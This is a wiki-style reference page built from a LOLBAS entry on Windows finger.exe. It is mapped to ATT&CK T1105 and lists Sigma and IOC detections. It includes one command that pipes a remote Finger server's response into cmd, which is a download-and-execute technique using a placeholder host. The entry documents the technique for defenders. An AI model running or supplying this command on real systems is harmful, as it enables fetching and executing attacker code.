---
title: "Finger.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Finger.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Finger.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Displays information about a user or users on a specified remote computer that is running the Finger service or daemon

## Paths

- `c:\windows\system32\finger.exe`
- `c:\windows\syswow64\finger.exe`

## Commands

### 1. Download

Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.

```cmd
finger user@example.host.com | more +2 | cmd
```

- Use Case: Download malicious payload
- Privileges: User
- Operating System: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
- IOC: finger.exe should not be run on a normal workstation.
- IOC: finger.exe connecting to external resources.

## Resources

- {'Link': 'https://twitter.com/DissectMalware/status/997340270273409024'}
- {'Link': 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)'}

## Acknowledgements

- {'Person': 'Ruben Revuelta (MAPFRE CERT)', 'Handle': '@rubn_RB'}
- {'Person': 'Jose A. Jimenez (MAPFRE CERT)', 'Handle': '@Ocelotty6669'}
- {'Person': 'Malwrologist', 'Handle': '@DissectMalware'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml)
